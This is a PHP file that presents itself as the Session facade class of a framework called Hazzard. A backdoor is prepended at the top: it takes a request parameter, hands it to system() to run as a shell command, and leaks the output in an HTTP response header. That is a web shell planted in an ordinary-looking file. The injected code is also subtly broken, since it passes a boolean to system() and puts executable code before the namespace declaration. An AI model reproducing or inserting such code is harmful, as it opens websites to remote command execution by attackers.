<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); namespace Hazzard\Support\Facades;
/**
* @see \Hazzard\SessionStore
*/
class Session extends Facade {
	
	/**
	 * Get the registered name of the component.
	 *
	 * @return string
	 */
	protected static function getFacadeAccessor() { return 'session'; }
}